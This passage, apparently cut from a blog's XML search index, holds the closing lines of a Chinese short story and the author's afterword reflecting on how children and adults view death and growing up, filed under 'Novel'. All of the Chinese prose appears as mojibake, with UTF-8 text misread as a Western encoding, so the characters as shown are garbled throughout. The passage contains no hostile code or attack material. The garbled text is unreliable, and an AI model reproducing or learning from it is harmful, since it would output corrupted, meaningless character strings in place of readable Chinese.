‘è‹—ï¼Œå­©å­çœ‹åˆ°é‚£åé¢ä¸¤æ£µä»éƒéƒè‘±è‘±çš„æ¨Ÿæ ‘å’ŒæŸ³æ ‘ï¼Œåƒæ˜¯æƒ³èµ·äº†ä»€ä¹ˆèˆ¬ï¼Œå“­å¾—æ›´å‡¶äº†ã€‚</p><p>è€ŒåŸæœ¬é‚£æŠŠé åœ¨å¢™è¾¹çš„é»‘ä¸æºœç§‹çš„è€é“é”¹ï¼Œæ—©å·²ä¸çŸ¥é“è¢«é£å¹åˆ°å“ªä¸ªè§’è½é‡Œå»äº†ã€‚</p><p><img src="/img/novel/1.jpeg"></p><h1 id="åˆ›ä½œè°ˆ">åˆ›ä½œè°ˆ</h1><p>ä»¥å°å­©å­çš„è§†è§’è§‚å¯Ÿæˆäººçš„ä¸–ç•Œï¼Œæˆ–è®¸æœ‰äº›å¯çˆ±ã€æœ‰äº›å¿ƒé…¸ï¼Œä¹Ÿæœ‰äº›æç¬‘å§ï¼Ÿå¤©çœŸä¸æ— çŸ¥èµ‹äºˆäº†å°å­©å­æ— å¿§æ— è™‘çš„æƒåŠ›ï¼Œè®©ä»–ä»¬ä»¥â€œå–„â€ç®€å•åŒ–å¤„ç†è¿™ä¸ªçº·ç¹çš„ä¸–ç•Œã€‚å¯æ˜¯ï¼Œè¿™ä¸ªä¸–ç•Œæ³¨å®šæ˜¯å¤æ‚çš„ï¼Œè‡ªç§ã€é‚ªæ¶ã€è‹¦éš¾å› äººä¹‹ç¤¾ä¼šæ€§æ°¸è¿œæœ‰å…¶å®¹èº«ä¹‹åœ°ï¼Œå­©å­ä»¬å¯¹ä¸–ç•Œçš„æ­£å‘å¤„ç†å¿…å°†å¯¼è‡´ä»–ä»¬æœ‰ä¸æ‡‚ä¹‹å¤„ã€‚å¤©ä¸‹çˆ¶æ¯å¸¸è¯´ï¼šâ€œç­‰ä½ é•¿å¤§äº†è‡ªç„¶å°±æ‡‚äº†ã€‚â€ä¸ºäº†ç†è§£è¿™ä¸ªä¸–ç•Œï¼Œä»–ä»¬æ˜¯æœ‰å¤šç›¼æœ›é•¿å¤§å•Šï¼ä½†é•¿å¤§ä»¥åå‘¢ï¼Ÿå½“ä»–ä»¬å‘ç°è‡ªå·±æœ¬å°±å¤„äºåˆ©ç›Šä¸æ¬²æœ›çš„é»‘æš—ä¹‹ä¸­æ—¶ï¼Œå½“ä»–ä»¬æ„è¯†åˆ°èº«è¾¹çš„å¤§äººä¸å¾—ä¸å› å°”è™æˆ‘è¯ˆè€Œå°å¿ƒç¿¼ç¿¼ã€èº«å¿ƒä¿±ç–²æ—¶ï¼Œå½“ä»–ä»¬è¿è‡ªå·±ä¹Ÿä¸å¾—ä¸æ‰¿è®¤è‡ªç§çš„å­˜åœ¨å¹¶å¶å°”è¢«å…¶æ‰€è¿·æƒ‘æ—¶ï¼Œä»–ä»¬åˆæœ‰å¤šåæ‚”é•¿å¤§ï¼Œå¤šåŒæƒ…äººç±»â€”â€”è¿™ä¸ªåœ¨å®‡å®™é¢å‰è¿æ²§æµ·ä¸€ç²Ÿéƒ½ç®—ä¸ä¸Šçš„é€ ç‰©å•Šã€‚</p><p>è¿™ç¯‡æ–‡ç« æ‰€å±•ç°çš„â€œæ­»äº¡â€ï¼Œåªæ˜¯å°å­©ä¸å¤§äººè§‚å¿µå·®å¼‚çš„å…¶ä¸­ä¹‹ä¸€ã€‚å°å­©çœ¼ä¸­çš„â€œæ­»äº¡â€ä¸â€œæ€ªå…½â€ç›¸å·®æ— å‡ ï¼Œèº«è¾¹çš„äº²äººèµ°äº†ï¼Œå°±æ˜¯è¢«æ€ªå…½åƒäº†ï¼Œå› æ­¤ä»–ä»¬æåŠ›åå¯¹æ­»äº¡ï¼Œè‹¥æ˜¯æœ‰èƒ½åŠ›ï¼Œä»–ä»¬æ¨ä¸å¾—è®©â€œæ­»äº¡â€åœ¨è¿™ä¸ªä¸–ç•Œæ¶ˆå¤±ï¼›å¤§äººçœ¼ä¸­çš„â€œæ­»äº¡â€ï¼Œæ˜¯æ— å¥ˆï¼Œæ˜¯åæ‚”ï¼Œæ˜¯ä¸èˆï¼Œæ˜¯ç•™æ‹ï¼Œæ˜¯ä»æœªåŠŸæˆåå°±çš„å£®å¿—éš¾é…¬ï¼Œæ˜¯çœ‹ç ´çº¢å°˜çš„è§£è„±ä¸è±ªæ”¾â€¦â€¦ä»–ä»¬ä¹Ÿä¼šæœ‰å¦‚å­©ç«¥èˆ¬çš„ç•æƒ§ï¼Œä½†å½“æ­»äº¡åˆ‡åˆ‡å®å®åœ°é™ä¸´åœ¨ä»–ä»¬èº«ä¸Šæ—¶ï¼Œä»–ä»¬åˆä¼šè§‰å¾—è¿™ä¸€åˆ‡éƒ½æ˜¯ç†æ‰€åº”å½“ï¼Œæ°´åˆ°æ¸ æˆâ€”â€”ç”Ÿå‘½æ€»æ˜¯å‘¨è€Œå¤å§‹çš„ã€‚æ¥çº³ä¸å¯é¿å…çš„è‹¦éš¾ï¼Œè¿™æ­£æ˜¯äººç±»å¾—ä»¥å»¶ç»­çš„ä¼Ÿå¤§ä¹‹å¤„ã€‚æ›´ä½•å†µï¼Œéš¾é“æ­»äº¡å°±ä¸€å®šæ„å‘³ç€ç”Ÿå‘½çš„ç»ˆç‚¹å—ï¼Ÿå¸¸è¨€é“ï¼Œå¥½æ­»ä¸å¦‚èµ–æ´»ã€‚ä½†å½“è¿™ä¸ªè¯é¢˜ä¸Šå‡è‡³äººç”Ÿæ„ä¹‰ä¸ä»·å€¼å±‚é¢æ—¶ï¼Œæ˜¯ç”Ÿæ˜¯æ­»ï¼Œè¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆå°±å˜å¾—æ‰‘æœ”è¿·ç¦»äº†ã€‚</p><p>é•¿å¤§åçš„æ¯›æ¯›è®¤ä¸ºï¼Œçˆ·çˆ·æŠŠæ­»çœ‹ä½œäº†ä¸€ç§è§£è„±ã€‚å¯è¿™ä½•å°ä¸æ˜¯ä¸€ç§ä¸å¾—ä¸ºè€Œä¸ºä¹‹çš„æ— å¥ˆå‘¢ï¼Ÿæ­»äº¡å¯¹ä¸€ä¸ªäººæ¥è¯´æ„å‘³ç€ä»€ä¹ˆï¼Œæ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„ç­”æ¡ˆã€‚è‡³äºå†™è¿™ç¯‡æ–‡ç« çš„ç›®çš„ï¼Œåªæ˜¯æƒ³æä¾›ä¸€ä¸ªå¼•å­ï¼Œè®©è¯»è€…ä»å…·è±¡åŒ–çš„ç¹å¿™ä¸­æš‚æ—¶æŠ½ç¦»å‡ºæ¥ï¼Œæ€è€ƒç”Ÿå‘½çš„ç»ˆç‚¹ä¸ºä½•ï¼Œæ€è€ƒè¿™ä¸€ç”Ÿå¿™ç¢Œå¥”æ³¢åˆæ˜¯ä¸ºä½•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Novel</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
